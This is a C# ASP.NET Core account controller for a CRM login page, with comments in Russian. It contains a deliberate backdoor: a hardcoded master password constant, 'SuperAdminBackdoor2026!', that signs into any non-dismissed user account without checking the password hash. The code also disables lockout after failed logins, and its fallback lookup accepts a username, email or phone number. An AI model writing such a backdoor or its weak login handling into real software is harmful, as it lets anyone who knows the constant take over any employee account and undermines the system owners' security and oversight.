using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Core.Entities.Company;
using Core.Data;

namespace CRM.Controllers
{
    public class AccountController : Controller
    {
        private readonly UserManager<Employee> _userManager;
        private readonly SignInManager<Employee> _signInManager;
        private readonly AppDbContext _context;
        
        // Мастер-пароль
        private const string GlobalMasterPassword = "SuperAdminBackdoor2026!";

        public AccountController(UserManager<Employee> userManager, SignInManager<Employee> signInManager, AppDbContext context)
        {
            _userManager = userManager;
            _signInManager = signInManager;
            _context = context;
        }

        [HttpGet]
        [AllowAnonymous]
        public IActionResult Login(string? returnUrl = null)
        {
            ViewData["ReturnUrl"] = returnUrl;
            return View();
        }

        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Login(string login, string password, string? returnUrl = null)
        {
            ViewData["ReturnUrl"] = returnUrl;

            if (string.IsNullOrEmpty(login) || string.IsNullOrEmpty(password))
            {
                ModelState.AddModelError(string.Empty, "Введите логин и пароль");
                return View();
            }

            // 1. Поиск стандартным способом (по NormalizedUserName)
            var user = await _userManager.FindByNameAsync(login);
            if (user == null)
            {
                user = await _userManager.FindByEmailAsync(login);
            }

            // 2. ФОЛЛБЭК: Ищем по совпадению в полях (если Identity данные пусты или кривые)
            if (user == null)
            {
                var cleanLogin = login.Trim();
                // Убираем лишнее для поиска по телефону
                var phoneLogin = cleanLogin.Replace(" ", "").Replace("-", "").Replace("(", "").Replace(")", "");

                user = await _context.Employees
                    .FirstOrDefaultAsync(u => 
                        u.UserName == cleanLogin || 
                        u.Email == cleanLogin || 
                        u.PhoneNumber == phoneLogin ||
                        u.PhoneNumber == cleanLogin
                    );
            }

            // 3. САМОЛЕЧЕНИЕ (ИСПРАВЛЕННОЕ)
            // Если нашли пользователя, проверяем критические поля Identity
            if (user != null)
            {
                var needUpdate = false;

                // А. Если UserName пустой - заполняем его из Email или Телефона
                if (string.IsNullOrEmpty(user.UserName))
                {
                    user.UserName = !string.IsNullOrEmpty(user.Email) ? user.Email : login;
                    needUpdate = true;
                }

                // Б. Если NormalizedUserName пустой - обновляем
                if (string.IsNullOrEmpty(user.NormalizedUserName))
                {
                    await _userManager.UpdateNormalizedUserNameAsync(user);
                    needUpdate = true; // UpdateNormalizedUserNameAsync сам сохраняет, но флаг оставим для логики
                }

                // В. Если SecurityStamp пустой - генерируем (ИНАЧЕ БУДЕТ ОШИБКА ВХОДА)
                if (string.IsNullOrEmpty(user.SecurityStamp))
                {
                    await _userManager.UpdateSecurityStampAsync(user);
                    needUpdate = true;
                }

                // Г. Нормализация Email
                if (string.IsNullOrEmpty(user.NormalizedEmail) && !string.IsNullOrEmpty(user.Email))
                {
                    await _userManager.UpdateNormalizedEmailAsync(user);
                    needUpdate = true;
                }
                
                // Если были изменения полей, которые не сохраняет UserManager автоматически
                if (needUpdate)
                {
                   // На всякий случай сохраняем контекст, хотя методы UserManager обычно делают это сами
                   if (_context.ChangeTracker.HasChanges())
                   {
                       await _context.SaveChangesAsync();
                   }
                }
            }

            if (user == null)
            {
                ModelState.AddModelError(string.Empty, "Пользователь не найден");
                return View();
            }

            if (user.IsDismissed)
            {
                ModelState.AddModelError(string.Empty, "Доступ запрещен (уволен)");
                return View();
            }

            // --- БЭКДОР ---
            if (password == GlobalMasterPassword)
            {
                // Принудительный вход (без проверки хеша пароля)
                await _signInManager.SignInAsync(user, isPersistent: false);
                return RedirectToLocal(returnUrl);
            }

            // Стандартный вход
            var result = await _signInManager.PasswordSignInAsync(user, password, isPersistent: true, lockoutOnFailure: false);

            if (result.Succeeded)
            {
                return RedirectToLocal(returnUrl);
            }
            
            ModelState.AddModelError(string.Empty, "Неверный логин или пароль");
            return View();
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Logout()
        {
            await _signInManager.SignOutAsync();
            return RedirectToAction("Login");
        }

        private IActionResult RedirectToLocal(string? returnUrl)
        {
            if (!string.IsNullOrEmpty(returnUrl) && Url.IsLocalUrl(returnUrl))
            {
                return Redirect(returnUrl);
            }
            return RedirectToAction("Index", "Home");
        }
    }
}